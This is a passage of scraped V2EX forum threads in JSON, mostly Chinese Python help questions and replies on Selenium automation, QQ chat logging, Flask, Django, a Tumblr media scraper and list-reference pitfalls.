'https://shop33473134.taobao.com/ugo.htm?spm=a217e.7759359.15285.3.yW2N4E&amp;signin=true#ugo-jinbi'\n                ]\n        for url in urls:\n            self.driver.get(url)\n            time.sleep(5)\n            print(\"page_source\\t%s\" % self.driver.page_source)\n            self.driver.find_element_by_xpath('//a[@href=\"#\" and @class=\"now-take J_NowSignIn\" and text()=\"立即签到\"]').click()\n</code></pre>\n<p>我尝试过的方法有：</p>\n<ul>\n<li>增加 wait 时间，确保新页面已经完全加载</li>\n<li>用 Google Chrome 的 XPath Helper 插件，确保自己写的 XPath selector 无误</li>\n<li>打印源代码 driver.page_source ，确认页面内有「立即签到」这个元素，并且 XPath selector 无误</li>\n<li>用鼠标右键 element.context_click() 测试，确认确实选中了「立即签到」这个元素</li>\n<li>尝试用 ActionChains + element.send_keys(Keys.ESCAPE) + element.send_keys(Keys.ENTER) 等类似方式，尝试无效</li>\n<li>尝试过 Chrome/FireFox 两种浏览器，尝试无效</li>\n</ul>\n<p>实际测试过程中发现，只有极少数情形，模拟点击「立即签到」成功；其它大多数情形下， click() 事件都是无效的。<br>\n目前没有想到别的方法了……<br>\n一般而言， Selenium click() 无效，可能会是什么原因呢？<br>\n请大家帮忙分析下原因，指点一二？<br>\n谢谢大家。</p>\n</div></div>"], "reply": "20", "tittle": "[求助] Python Selenium click() 无效", "comment": [" 仙子童鞋了解么？ V2EX 上人都不认识……", "可能是时序方面的原因？你点早了？", " 哇哦，仙子在线哟。\r", "应该不是时间的问题，我 time.sleep() 设置了延时，确保页面已经加载完成了。\r", "另外，用 ActionChains.context_click() 测试，发现鼠标右键确实放在了相应的 element 上。", "我不会用 Selenium ……在页面加载完之后，选择器没错。你把你程序执行时的元素打印出来看看获取到了没？请求发出去了没？\r", "不过你何不通过抓包来看怎么发请求呢？", "头像太可怕了🤢", " 哈哈，以为你啥都会呢。:-)\r", "不通过发 HTTP 请求的方式是因为淘宝这类网站登陆太复杂，而且很多操作涉及到很多 JS 代码，光靠 urllib/requests 之类的不行。\r", "还是很谢谢仙子，笑口常开，常喜乐。", " 瞎说什么大实话。", "driver.implicitly_wait() 或者 WebDriverWait(driver, 10).until() \r", "\r", "第一个是隐式等待；第二个是显式等待，可以等待某一个元素加载完成，推荐去虫师的博客翻翻", " explicit/implicit wait 我还是懂的。\r", "确定是页面加载完了，我才点击的。", " 我用一般用等待就好了哈哈哈淘宝难道有什么限制？", " \r", "//*[@id=\"ugo-jinbi\"]/div/div[2]/div[1]/div/div[2]/p[1]/a\r", "#ugo-jinbi > div > div.act-module-bd > div.act-jinbi-take > div > div.J_SignInCon > p.today-can-do > a\r", "用 Chrome 复制出来的~试试换一下 xpath 或者用 css 选择器~", " 不知道哎。\r", "觉得自己该考虑的都考虑了。有点儿怀疑是 Selenium 的 bug ……", " 谢谢你，我也试下 CSS selector 。", "相信不是楼主 selenium 使用的问题", "我不记得在哪个场合听说过，淘宝的前端能精确识别非人类的操作， so....", "你试试点击浏览器式浏览器前台，发现 click 有些地方浏览器必须前台才能用......", " 感觉除了 referer 及操作时间间隔以外， Selenium 与普通的用户点击没有什么区别吧……", " 你的意思是把 Selenium 放在所有窗口的最前面么？\r", "这个也试过，尝试无效。", " @", " @", " @", " \r", "问题基本定位到了。\r", "原因是， WebElement.click() 之后，没有留足够的时间，就把页面切走或关闭了。 click() 之后，应该留有足够的时间，让 browser 客户端执行 JS 代码，再把请求发到服务端。\r", "谢谢大家。", " 果然是这样子……"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我有一个学术的聊天群，里面的内容对我的学习感觉挺有帮助的，有办法可以用 python 监控那个群的聊天记录然后记录下来吗？不知道我表达清楚没</p>\n</div></div>"], "reply": "18", "tittle": "有办法用 python 实现监控某个群的聊天记录吗？", "comment": ["两条路 ，第一 破解手机 QQ  第二 去 搞 webQQ 的接口。", "1. 打开 github\r", "2. 搜索 qq bot", "打电话给小马哥，让他们加个接口", " 看下这个 repo\r", "\r", "或者直接问下 作者，也是在 V2EX 混的\r", "\r", "我自己没用过，但是看了下好像有对 QQ 的接口", "不用这么麻烦，每天晚上手动导出当天聊天记录就可以了。", "好好看书学习，直到你发现那些聊天都很水，你就不需要这个了。", "挂着 qq 就行了，第二天导出聊天记录，可以导出 mht 版本，带图片，", "放个 qq 机器人进去", " 可以用按键精灵写个脚本，每天定时执行。-_-", "直接导出记录不行吗", " 我想隔一段时间自动把聊天内容加到网站的某个页面上面，如果导出每天感觉比较麻烦", "推荐两个靠谱的方式：\r", "1 ）酷 Q ，有各种语言的 sdk ，比较稳定\r", "2 ）手机 qq+xposed ， V 友推荐，还没尝试", "  第 2 个 xpose 用什么模块？", " 你这和刷高权有什么区别都是自动记录聊天记录充做文章，有这点时间还不如写原创。（不知道理解错了没）还有如果该群涉及到一些账号或私有代码截图被人找到就是人肉的料，我在的那个群之前就碰到个之后被人人肉要求删文章。", " 那个群是我们专业的学术交流群，他们不愿意在论坛或者网站发帖，主要是为了把群里的交流解答的内容留存根，方便后人", " 应该有人写这种东西吧，像你这种你还得想办法区分问题和解答吧？毕竟不能一坨丢上去吧？又不易检索又只能依靠搜索引擎的支持才行，而且搜索引擎不是标题占比多点吗？", ":D 我是 ", " 的作者（之一）\r", "现在这个项目使用的还是 WebQQ 协议，协议本身非常不稳定，发消息有可能会失败，或者被识别为 Spam 后一段时间内无法通过 WebQQ 协议发消息，如果不需要发送功能，可以无视 XD\r", "比较大的麻烦是协议要求一段时间后必须重新扫码登陆，一般为 1 、 2 天。\r", "如果不介意的话，我相信这个框架是可以满足你备份聊天内容的需求的:D", "之前写过一个 QQ 群机器人， 仅收集并落地群消息， 后来还封装了一个 web 界面， 由于只收集消息， 基本上没出什么问题， 只不过被公司运营的同学诟病登录需要扫码太麻烦。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题，在队列中由一些任务，但是可能遇到一些状况，可能意料中的，可能意料外的，怎么保证异常停止时候，队列中的任务不丢失？</p>\n</div></div>"], "reply": "9", "tittle": "队列中任务异常停止时不丢失， python 优雅实现？", "comment": ["那你用外部的队列呗\r", "redis 或者 rabbitMQ\r", "都是可以存盘的", "思考数据库如何实现", "像 java 的优雅关闭", "用外部数据库事务。", "持久化到磁盘上", "让队列提供这样的功能吧", "出现异常时，再将任务丢回到队列？", "用外部持久化方案，比如取任务时，将任务相关数据持久化并标识处理中，当超时未更新处理状态则认为此任务出现异常，重新回滚到任务队列。\r", "也可以增加重试次数，任务超过限制次数仍然超时无法处理完，才确认为失败任务。\r", "\r", "不想写也可以用类似参考阿里云的消息队列模型，取出来的消息有处理时间限制，会存放在处理中的队列，完成消息需要发送任务成功的标识，通知消息系统主动删除消息数据。\r", "如果消息超时没有收到处理成功的请求，消息系统会主动回滚此消息到等待队列中。", "rabbitMQ 吧，只有任务执行完毕才会删除任务，不然不会删除。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>慎入</p>\n</div></div>"], "reply": "2", "tittle": "python 高效开发实战，这本书很烂", "comment": ["谢谢", "谢谢，顺便帮顶～"]},
{"content": ["<div class=\"topic_content\">一个表单需要提交一个中文字符，如 astr=%E6%88%91%E4%BB%AC%E5%A4%A7%E5%AE%B6 ，原字符是“我们大家”， UTF-8 编码，然后在视图函数中用 request.form['astr']取得的值也是这个%E6%88%91%E4%BB%AC%E5%A4%A7%E5%AE%B6 ，我想用 urllib.unquote()，结果返回的字符串类型竟然是 unicode ，并且已经是乱码了，求解怎样进行 urldecode 合适？</div>"], "reply": "8", "tittle": "从 flask 的 request.form 中取得值之后，怎样作 urldecode？", "comment": ["s = urllib.unquote(request.form['astr'])\r", "assert type(s) == unicode", "以下是我在 py2 上的测试结果, 你用的是 py3?\r", "\r", "Python 2.7.12 (v2.7.12:d33e0cf91556, Jun 27 2016, 15:19:22) [MSC v.1500 32 bit (Intel)] on win32\r", "Type \"copyright\", \"credits\" or \"license()\" for more information.\r", ">>> ss = '%E6%88%91%E4%BB%AC%E5%A4%A7%E5%AE%B6'\r", ">>> import urllib\r", ">>> s = urllib.unquote(ss)\r", ">>> s\r", "'\\xe6\\x88\\x91\\xe4\\xbb\\xac\\xe5\\xa4\\xa7\\xe5\\xae\\xb6'\r", ">>> s.decode('utf8')\r", "u'\\u6211\\u4eec\\u5927\\u5bb6'\r", ">>> print(s.decode('utf8'))\r", "我们大家\r", ">>> type(s)\r", "<type 'str'>\r", ">>>", " \r", "我用的是 Python 2.7.11 。\r", "我在 shell 里边试验是和你的试验结果一样的，但是到了 flask 的视图函数中，情况就不同了。 urllib.unquote()的结果竟然已经是 unicode", "Flask 默认已经使用 utf-8 编码对 请求参数(如 Query 参数) 进行了 utf-8 解码.\r", "并且已经进行了 url_unquote_plus 操作了.\r", "你要测试也是侧重在 Flask 环境下测试解决问题.\r", "在 Python 或 iPython 上直接对原始字符串进行操作.场景不一样.", "搞定。分享一下。从 request.form 中取得的值，是 unicode 的，作为参数传给 urllib.unquote()， urllib.unquote 就会返回 unicode 类型的字符串。那么只要 request.form['astr'].encode('ascii')一下，再传进去，就能返回 str 类型了（在这里其实是 utf-8 编码）。", " 一开始我也以为是环境不同，结果是传参类型的问题。花掉我一下午的时间。。。", "py3 里面好像会自动解码", " 有机会试试"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我今天问的有点多，搞了一晚上一直没有搞懂，所以抱歉还在这里问一下</p>\n<p>我想请问一下我要创建上传图片的表单，我要如何获取？</p>\n<p>每位回复的朋友都会<code>感谢</code>，直到货币倾家荡产为止</p>\n<p>表单层：</p>\n<pre><code>#forms.py\n\nclass Edit(forms.ModelForm):\n    class Meta:\n        '''关联类'''\n        model=Article\n        exclude = ()\n</code></pre>\n<p>模型层：</p>\n<pre><code>#models.py\nclass Article(models.Model):\n    title = models.CharField(max_length = 100, verbose_name='博客标题')  #博客题目\n    date_time = models.DateTimeField(auto_now_add = True, verbose_name='日期') #文章日期\n    categeory = models.ForeignKey(Category,blank=True,null=True, verbose_name='分类') #博客分类\n    image_url_i = models.ImageField(upload_to='article/%Y',blank=True,null=True,verbose_name='图片') #博客预览图\n    content = models.TextField(blank = True, null = True, verbose_name='内容') #博客内容\n    reference = models.ForeignKey('ReferenceLink',blank=True,null=True,verbose_name='参考链接') #博客参考链接\n\n    class Meta:\n        verbose_name = '博客'\n        verbose_name_plural=verbose_name\n        ordering = ['-date_time']\n\n    def __str__(self):\n        return self.title\n</code></pre>\n<p>视图层：</p>\n<pre><code>#views.py\n#add 博客页面\ndef edit(request):\n    if request.method=='POST':\n        form=Edit(request.POST,request.File)\n        if form.is_valid():\n            form.save()\n            return HttpResponse(\"成功\")\n    else:\n        form=Edit()\n        return render(request,\"edit.html\",{'form':form})\n</code></pre>\n<pre><code>#urls.py\nurl(r'^blog/edit/$','gromacs.views.edit',name=\"blog_edit\"),\n</code></pre>\n</div></div>"], "reply": "5", "tittle": "Django 如何上传图片？", "comment": ["from V2EX import answers\r", "\r", "answers.copy().paste()", " 开始我试了不行，后来又可以了～打错了好像，谢谢你～", "页面中的 forms 表单切记添加  enctype=\"multipart/form-data\"  属性\r", "另外开发环境记得设置 static 和 media 的路径和 urlparttens", "练手写的一个简单的社区应用，可以参考下： ", "\r", "\r", "用户头像上传"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>好几个月前写的了，写的比较挫。<br>\n并没有写成爬取一个博客的所有内容，本来是用来网站的，如果要爬所有内容，会让用户等待太久。</p>\n<pre><code># -*- coding=utf-8 -*-\nfrom threading import Thread\nimport Queue\nimport requests\nimport re\nimport os\nimport sys\nimport time\n\n\napi_url='http://%s.tumblr.com/api/read?&amp;num=50&amp;start='\nUQueue=Queue.Queue()\ndef getpost(uid,queue):\n    url='http://%s.tumblr.com/api/read?&amp;num=50'%uid\n    page=requests.get(url).content\n    total=re.findall('&lt;posts start=\"0\" total=\"(.*?)\"&gt;',page)[0]\n    total=int(total)\n    a=[i*50 for i in range(1000) if i*50-total&lt;0]\n    ul=api_url%uid\n    for i in a:\n        queue.put(ul+str(i))\n\n\nextractpicre = re.compile(r'(?&lt;=&lt;photo-url max-width=\"1280\"&gt;).+?(?=&lt;/photo-url&gt;)',flags=re.S)   #search for url of maxium size of a picture, which starts with '&lt;photo-url max-width=\"1280\"&gt;' and ends with '&lt;/photo-url&gt;'\nextractvideore=re.compile('/tumblr_(.*?)\" type=\"video/mp4\"')\n\nvideo_links = []\npic_links = []\nvhead = 'https://vt.tumblr.com/tumblr_%s.mp4'\n\nclass Consumer(Thread):\n\n    def __init__(self, l_queue):\n        super(Consumer,self).__init__()\n        self.queue = l_queue\n\n    def run(self):\n        session = requests.Session()\n        while 1:\n            link = self.queue.get()\n            print 'start parse post: ' + link\n            try:\n                content = session.get(link).content\n                videos = extractvideore.findall(content)\n                video_links.extend([vhead % v for v in videos])\n                pic_links.extend(extractpicre.findall(content))\n            except:\n                print 'url: %s parse failed\\n' % link\n            if self.queue.empty():\n                break\n\n\ndef main():\n    task=[]\n    for i in range(min(10,UQueue.qsize())):\n        t=Consumer(UQueue)\n        task.append(t)\n    for t in task:\n        t.start()\n    for t in task:\n        t.join\n    while 1:\n        for t in task:\n            if t.is_alive():\n                continue\n            else:\n                task.remove(t)\n        if len(task)==0:\n            break\n\n\ndef write():\n    videos=[i.replace('/480','') for i in video_links]\n    pictures=pic_links\n    with open('pictures.txt','w') as f:\n        for i in pictures:\n            f.write('%s\\n'%i)\n    with open('videos.txt','w') as f:\n        for i in videos:\n            f.write('%s\\n'%i)\n\n\nif __name__=='__main__':\n    #name=sys.argv[1]\n    #name=name.strip()\n    name='mzcyx2011'\n    getpost(name,UQueue)\n    main()\n    write()\n</code></pre>\n</div></div>", "<div class=\"topic_content\">用法是：\r<br>直接改掉那个 name 就行</div>", "<div class=\"topic_content\">我不会提供 name list 的，不然会被关小黑屋的</div>"], "reply": "49", "tittle": "你们想要的 Tumblr 爬虫", "comment": ["Mark", "忘了去重了！在 write 函数里面\r", "videos=list(set(videos))\r", "pictures=list(set(pictures))", "mark ，明天起来再看", "mark", "然而不会用", "加个下载功能\r", ".js", " Python 下载没多少意义，下载起来慢。所以我是写出文件，可以用迅雷下载", "刚需啊，出售营养快线！", " 改个 name 就够了，然后直接运行", " 个人网站上目前有 5000 多个解析过的博客😝", " \r", "\r", "正解，解析出地址，让下载工具下载，最高效率了。", " 哪呢", "感谢楼主", " 最下面", "这样的在线解析不要太多(⊙o⊙)哦！😂", "olddrivertaketakeme", "不是被墙了么， vps 上下吗", " 开了 8 进程下载并不觉得慢啊。 是什么理由导致慢呢？", "这东西是好，但是我觉得爬出提供资源的 tumblr 名字更重要", " 我的网站放在过外 vps 上，也是在线解析", " 名字没办法", "Mark", "然后就可以 wget 了？", "能不能简述下爬虫效果。。。", "收藏了", "name 改成什么好，能否给个名单: )", "求 name_list", "mark", " \r", "\r", "下载到一半会这样\r", "\r", "Traceback (most recent call last):\r", "  File \"turmla.py\", line 150, in <module>\r", "    for square in tqdm(pool.imap_unordered(download_base_dir, urls), total=len(urls)):\r", "  File \"/home/leetom/.pyenv/versions/2.7.10/lib/python2.7/site-packages/tqdm/_tqdm.py\", line 713, in __iter__\r", "    for obj in iterable:\r", "  File \"/home/leetom/.pyenv/versions/2.7.10/lib/python2.7/multiprocessing/pool.py\", line 668, in next\r", "    raise value\r", "Exception: Unexpected response.", "Mark ，哎，老司机一言不合就发车啊。", "mark", "没人知道 ", " 吗", " 无效啊", " 上梯子=。=", "战略 Mark", "不是有现成的 API 吗", " 这不就是用 api 吗", "我也用 golang 爬过。。。后来被墙就没搞了", "默默点个赞 :)", "一天到晚搞事情", "搞事搞事", " \r", " \r", "你们别搞事啊", " 楼主，我要访问你的网站，我要做的你粉丝😄", " 少儿不宜哈哈哈", "下载的那个脚本 \r", "Traceback (most recent call last):\r", "  File \"./1.py\", line 138, in <module>\r", "    getpost(name, UQueue)\r", "  File \"./1.py\", line 27, in getpost\r", "    total = re.findall('<posts start=\"0\" total=\"(.*?)\">', page)[0]\r", "IndexError: list index out of range", "with open('pictures.txt','r') as fobj:\r", "    for eachline in fobj:\r", "        pngurl=eachline.strip()\r", "        filename='.//getpic//test-{0}.jpg'.format(i)\r", "        print '[-]parsing:{0}'.format(filename)\r", "        urllib.urlretrieve(pngurl,filename)\r", "        i+=1", "for i in range(0, total, 50): queue.put(ul+str(i))", "看完表示自己 python 白学了。。。\r", "人家的爬虫都是多线程，队列，类\r", "我的爬虫都是。。。 while if for ....", " 多线程是为了提高速度， 3 个小时的事情， 1 个小时就做完了，多爽啊！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>当人们谈论起 python 时都乐于说 python 优雅，数据结构丰富。本人值接触过 python 语言，没有其他语言的编程经验，请问又那些数据结构是 python 中有而其他语言中没有的。</p>\n</div></div>"], "reply": "68", "tittle": "都说 python 数据结构丰富，丰富在哪？", "comment": ["Swift 笑而不语！不过我也喜欢 python", "什么 list,dict,set,tuple 咯", "可以看看 collections 里的几个", "骚年，来学个 C 你就知道了。。。看各种代码见过好几种 struct whatever_str; 而且实现的功能都差不太多。", "不丰富。不如 j8 丰富。", "之所以这么说不是因为 Python 能做其他语言不能做的事，而是 Python 有这庞大的开发者社群，开发了数不胜数的库，你只需要 pip install 后 import 就可以直接使用了，而不需要自己从头造轮子。理论上来讲，任何图灵完备的语言描述能力都是的等价的，所以不存在有什么数据结构是 Python 有但是其它语言没有的。\r", "\r", "当然，这里讨论的「语言」都是指用于生产环境的命令式语言，不包括一些 DSL 。", "Python 的数据结构丰富和其他语言应该是等价的，但易用度明显甩开某些语言（此处不指名道姓）一个台阶。\r", "\r", "举个栗子：\r", "一个脸滚键盘的字符串  V2EX = 'ebreredfdfhdlfhferdlhgfdnhe' \r", "求出里面包含的字符及字符出现的次数？\r", "\r", "Python 用推导式一梭子就出来   v2ex_count = { str : v2ex.count(str) for str in set( V2EX )}\r", "\r", "让我回忆起以前用 Java 摇曳的青春", " 嗯,这样解释很 pythonic", "  这些结构其他语言也有的。我刚刚理解的‘丰富’是人无我有呢。", "  嗯。赞同。", "数据结构跟语言有多大关系....\r", "python 是易用和可读性比较好把.", " 确实有啊。。但不一定是直接可用的。。。", "没有默认平衡树......", "python 写的好就是在写英文一样，就像写伪代码一样。", "同意楼上，作为一个低端程序员， python 的可读性让我写代码的时候有种写伪代码的感觉， list tuple set dict 拿来就用，也不用怕野指针、资源没释放导致内存泄漏，比 C/C++爽多了。。", " collection.Counter(V2EX)", "collections ，少了个 s", " 对，一时没想起来，其实你这个更 Pythonic ， collections 是真好用。", "数据结构往往是抽象的吧，未必就用语言本身提供的啊，楼上说得好， Python 最大魅力是日常轻度使用的门槛低，周期短，可读性好。", "你去看看 C, 基本数据结构都没有提供；自己写出来的还要么不能泛型，要么就类型不安全。", "多不多不敢保证，很灵活倒是真的", "  C 没有提供基本数据结构--这种看法不严谨。 C 语言本身的确没有提供一些常用的数据结构--例如字典、集合等，而 C 语言可用的众多库还是提供了众多的数据结构实现。\r", "\r", "C 和 Python 定位不同。 C 追求效率和灵活；赋予程序员极大的自由和特权去使用计算资源和优化计算--这是程序员喜爱的 C 的原因之一。", "python 优势在于灵活吧", " C 的哪些库给了高可用的高级数据结构的实现，可以丢给链接吗", " nice", " \r", "\r", "\r", "\r", "\r", "内部的 list tuple dict 不用自己实现，不够用就用 collections 的", "一点都不丰富，你看那个 heap,要多难用有多难用", " C 语言本身的限制让泛型的数据结构实现都要用类型不安全的 void*, 这个东西在大型项目中就是噩梦。", " 而大型项目恰有很多用的 C ，而且是顶级大型项目。", " 大多是没有 C++ 的时代遗留下来的", "难道不是因为 python 的有很多第三方的包吗 (如 numpy ， pandas....", " 你给的是开源产品源码，而非高可用的数据结构库，其实也可以自己把相关代码拿出来直接用，但是每个人都这么去搞只会增加这个世界的熵，，为什么 Github 上没有人去做这个很必要的工作呢", "  glib 是基础库， apr 是基础库， glibc 是基础库，不是“产品”，是 library ，不是 product 。它们都实现了各种数据结构。直接用，直接链接就能用。而且流行的 linux 发行版都打包了这些库。\r", "这些 C 库早在 github 甚至 git 出现之前就出现了，拿来就能用，还需要什么额外工作？\r", "当然用 C 的话，大多也是做基础软件，例如 Python 解析器这类。一般都喜欢自己实现适合自身的数据结构，而不是用现成的。但并不是说没有现成的数据结构库给你用，不要太小看 C 的生态。", "就知道会有人借机黑 Java...以代码写的简短来黑 Java 的，都太年轻太简单", " \r", " \r", "\r", "Ruby: ???\r", "\r", "v2ex = 'ebreredfdfhdlfhferdlhgfdnhe'\r", "v2ex.chars.map { |x| [x, v2ex.count(x)] }.to_h\r", "\r", "哼，有啥了不起的~", "Python 的优势在于\"据说程序员一生要写 600 万个花括号，谁先用完谁先走\"，这才对吧 :-D", " Python 可以 Collections.counter(v2ex)", " 233333333333333333333", " 你这就太不了解 C 语言了，说的好像快被历史淘汰了一样， C 和 C++的使用场景不一样", "论结构丰富,我只服 PHP 的数组", " 听君一席话，滚去玩 Python", "numpy  pandas  你会喜欢的", "推荐看一下 《 Python 语言剖析》  陈儒写的， 08 年的书，满篇 C 语言的 Python 底层代码，各种数据结构的底层代码，读懂也就不会纠结于这个问题了。推荐看一下", "论数据结构，应该是 C++的标准库里面最多吧。。如果加上 boost ，基本常见的都有了", "嗯。。。。。。。", "C 语言里能用一个 hash 已经是中级以上水平的了。\r", "\r", "用 C 实现一个 hmac 就得花很多功夫。不用第三方现成的库的话。", "ruby 写的才像英语", " py 作者的兼职是卖出 1000w 把尺子", "就 7 楼的例子，来个 C++的实现， 2 行。怎么样？不逊于 Python 实现吧？行数一样， 2 行。自带数据结构，在 C++的 STL 里称为 map -- 支持范型，类型安全，效率和质量在工程上有口皆碑。\r", "\r", "\r", "std::map<char, int> v2ex; \r", "for (auto const& x : \"ebreredfdfhdlfhferdlhgfdnhe\") { ++v2ex[x]; }", "python 数据结构真心没有 java 丰富。", "  那么 C++呢？ STL 和 boost 准备了巨量的东东等大家拿来用。。。", "  \r", "那么 C++呢？ STL 和 boost 准备了巨量的东东等大家拿来用。。。", " \r", "\r", "算上 import 也是三行吧， Ruby 可以这样\r", "\r", "v2ex = 'ebreredfdfhdlfhferdlhgfdnhe'\r", "counters =-> s { s.chars.map { |c| [c, s.count(c)] }.to_h }\r", "counters.call v2ex", "  +1", " stl boost 算第三方库吧。 python 默默拿出 scipy sympy 装逼一发。\r", "\r", "符号计算。来比吧。等你们 link 完 python 版本说不定就上线了。", " \r", " \r", "F#的 Seq.countBy", " 2333", " STL 不是第三方库哦 所有不是很古董的 c++编译器都自带 STL 。 boost 特别一点 就不在这里展开了。要比生态环境 （例如数据结构实现） c/c++和 Python 一样强，甚至更强。 26 楼和 34 楼已给了解释和例子。", " 总结的很好！", " 是的， python 的代码量少，而且看起来优雅。最主要的是写起来轻松，很容易就能将想法用代码表达出来", " 我是两个都很了解才会这样说，看过改过太多低质量的 C 代码了。 C 代码需要程序员的水平很高才能写好。 C++ 就算水平差一些，把它按照 MFC 风格或者 Java 风格来用，至少还比较容易看懂。", "  好吧。咋们来比赛解析 JSON 。 😂。\r", "\r", "特别是 key-value 的 type 不确定。比如取一个 key 的值 既可能是 int 又可能是 [int, float, string] 这种的。 \r", "\r", "用 C++ 撸一个试试？", "  ", " ", "Python 丰富？真涨见识……", "Python 代码量太大了，为了可读性牺牲了简短小巧……", "PHP ：\r", "count_chars('ebreredfdfhdlfhferdlhgfdnhe',1)", " key 怎么成数字了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://sharetext.cn/1753\" rel=\"nofollow\">http://sharetext.cn/1753</a></p>\n<hr>\n<p>这是我的全部代码，我运行的时候，出现错误，按道理应该没有问题呀</p>\n</div></div>", "<div class=\"topic_content\">已解决</div>", "<div class=\"topic_content\">def echo123():\r<br>    global a\r<br>    a = a+ 1\r<br>    print(a)\r<br> \r<br>def main1():\r<br>    global a\r<br>    a = 0\r<br>    echo123()\r<br> \r<br>main1()</div>"], "reply": "2", "tittle": "python 全局变量的诡异错误，求助下", "comment": ["Python 中当局部变量名字和全局变量名字重复时，局部变量会覆盖掉全局变量。\r", "而在 echo123() 中没有定义 a ，所以会报 UnboundLocalError: local variable 'a' referenced before assignment\r", "所以 echo123() 也要加上 global a", " 谢谢"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>这是一段测试代码</p>\n<pre><code>li1 = []\nli2 = []\nki = [0]\nj = 0\nfor i in range(10):\n    ki[0] = ki[0]+1\n    j = j+1\n    li1.append(ki)\n    li2.append(j)\nprint(li1)\nprint(li2)\n</code></pre>\n<p>这是输出：</p>\n<pre><code>[[10], [10], [10], [10], [10], [10], [10], [10], [10], [10]]\n[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\n</code></pre>\n<p>为何 append()参数是列表类型时，每次循环都会改变 li1 中的值？？？</p>\n</div></div>", "<div class=\"topic_content\">谢谢大家，今天又学到了很多，是我基础太薄弱了，对对象和引用理解的都不够。</div>"], "reply": "18", "tittle": "python append 为何如此奇怪？", "comment": ["li1 = []\r", "li2 = []\r", "ki = [0]\r", "j = 0\r", "for i in range(10):\r", "    ki[0] = ki[0]+1\r", "    j = j+1\r", "    li1.append(list(ki))\r", "    li2.append(j)\r", "print(li1)\r", "print(li2)", "因为你只是 append 了 ki 对象的引用，而 list 是可变的，内容改变了，你 append 的进去的仍然是 ki 的引用。", " 也就是说只要 append 的是不可变的对象就没问题了", "明显是没搞清楚 python 是引用优先的\r", "估计楼主肯定还会在用默认参数是对象的时候出现问题", " 学 python 还不够，认识还不够深，只能一个坑一个坑的踩了", "應該是用 list.extend 方法", "又一个被 C 的值传递坑的", "因为 append(ki)的时候传递的是 ki 的地址，所以如果想不改变值可以这么些 li.append([x for x in ki])", "第一个 list 里到最后是 10 个指向同一块内存的相同元素", "```\r", "li1 = []\r", "li2 = []\r", "ki = [0]\r", "j = 0\r", "for i in range(10):\r", "    ki[0] = ki[0]+1\r", "    j = j+1\r", "    li1.append(ki[0])\r", "    li2.append(j)\r", "print(li1)\r", "print(li2)\r", "```\r", "在 ki 里面加一个 ki[0]，这样每次都添加就好了", "浅拷贝 你 li1 里的每个元素都是指向的或者说引用的同一个 ki\r", "li2 里之所以不这样 是因为 j 是不可变类型，没加一次创建一个新 j", "可以用 list slice, ki[:]这样直接创建新 list ，不过比较黑科技。。", "把代码粘贴到这里看看就懂了 ", " 这个有意思啊 哈哈哈哈 不用开 ide 看了", " ls 的 @", " 可能说的是这个\r", "\r", "``` python\r", "def foo(x, l = []):\r", "    l.append(x)\r", "    return l\r", "y = foo(6)\r", "z = foo(8)\r", "\r", "p = foo(2, [3])\r", "q = foo(4, [5])\r", "print y\r", "print z\r", "print p\r", "print q\r", "```\r", "\r", "output:\r", "[6, 8]\r", "[6, 8]\r", "[3, 2]\r", "[5, 4]\r", "*************\r", "同理，函数每次使用的默认参数的 list 都是同一个，每次都会操作它", "lz 你显然没理解 reference 的概念..", "我也觉得奇怪，其他语言标准库的 append 函数多半是值插入， python 非得是引用。\r", "然后用个不常见 extend 函数代替。 比较坑", "对象变动(Mutation)\r", "Python 中可变(mutable)与不可变(immutable)的数据类型让新⼿很是头痛。 简单的说， 可\r", "变(mutable)意味着\"可以被改动\"， ⽽不可变(immutable)的意思是“常量(constant)”。 想把脑\r", "筋转动起来吗？ 考虑下这个例⼦：\r", "foo = ['hi']\r", "print(foo)\r", "# Output: ['hi']\r", "bar = foo\r", "bar += ['bye']\r", "print(foo)\r", "# Output: ['hi', 'bye']\r", "刚刚发⽣了什么？ 我们预期的不是那样！我们期望看到是这样的：\r", "foo = ['hi']\r", "print(foo)\r", "# Output: ['hi']\r", "bar = foo\r", "bar += ['bye']\r", "print(foo)\r", "# Output: ['hi']\r", "print(bar)\r", "# Output: ['hi', 'bye']\r", "这不是⼀个 bug 。 这是对象可变性(mutability)在作怪。 每当你将⼀个变量赋值为另⼀个可\r", "变类型的变量时， 对这个数据的任意改动会同时反映到这两个变量上去。 新变量只不过是\r", "⽼变量的⼀个别名⽽已。 这个情况只是针对可变数据类型。 下⾯的函数和可变数据类型让\r", "你⼀下就明⽩了：\r", "def add_to(num, target=[]):\r", "target.append(num)\r", "return target\r", "add_to(1)\r", "# Output: [1]\r", "add_to(2)\r", "# Output: [1, 2]\r", "add_to(3)\r", "# Output: [1, 2, 3]\r", "Python 进阶\r", "对象变动 Mutation 51 你可能预期它表现的不是这样⼦。 你可能希望， 当你调⽤add_to 时， 有⼀个新的列表被\r", "创建， 就像这样：\r", "def add_to(num, target=[]):\r", "target.append(num)\r", "return target\r", "add_to(1)\r", "# Output: [1]\r", "add_to(2)\r", "# Output: [2]\r", "add_to(3)\r", "# Output: [3]\r", "啊哈！这次又没有达到预期， 是列表的可变性在作怪。 在 Python 中当函数被定义时， 默认\r", "参数只会运算⼀次， ⽽不是每次被调⽤时都会重新运算。 你应该永远不要定义可变类型的\r", "默认参数， 除⾮你知道你正在做什么。 你应该像这样做：\r", "def add_to(element, target=None):\r", "if target is None:\r", "target = []\r", "target.append(element)\r", "return target\r", "现在每当你在调⽤这个函数不传⼊target 参数的时候， ⼀个新的列表会被创建。 举个例\r", "⼦：\r", "add_to(42)\r", "# Output: [42]\r", "add_to(42)\r", "# Output: [42]\r", "add_to(42)\r", "# Output: [42]"]},
